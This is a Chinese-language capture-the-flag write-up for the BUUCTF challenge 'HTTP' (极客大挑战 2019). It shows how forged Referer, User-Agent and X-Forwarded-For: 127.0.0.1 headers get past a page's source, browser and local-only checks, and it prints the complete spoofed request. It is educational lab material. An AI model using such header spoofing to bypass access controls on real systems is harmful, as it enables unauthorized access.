# [极客大挑战 2019] HTTP

## 题目信息
- 平台：BUUCTF
- 考点：HTTP 请求头伪造
- 难度：⭐

## 解题步骤

### Step 1: 查看源代码

`Cmd+Option+U` 查看源码，发现隐藏链接：
```html
<a href="secret.php">
```

### Step 2: 绕过 Referer 检测

访问 secret.php，提示：
```
It doesn't come from 'https://Sycsecret.buuoj.cn'
```

添加 Referer 头：
```http
Referer: https://Sycsecret.buuoj.cn
```

### Step 3: 绕过浏览器检测

提示需要 `Syclover` 浏览器

修改 User-Agent：
```http
User-Agent: Syclover
```

### Step 4: 绕过 IP 限制

提示 `No!!! you can only read this locally!!!`

添加 X-Forwarded-For：
```http
X-Forwarded-For: 127.0.0.1
```

## 完整请求

```http
GET /secret.php HTTP/1.1
Host: xxx.buuoj.cn
Referer: https://Sycsecret.buuoj.cn
User-Agent: Syclover
X-Forwarded-For: 127.0.0.1
```

## 知识点

| 请求头 | 作用 |
|--------|------|
| Referer | 标识来源页面 |
| User-Agent | 标识浏览器类型 |
| X-Forwarded-For | 标识客户端 IP |
| X-Real-IP | 备选 IP 头 |
| Client-IP | 备选 IP 头 |
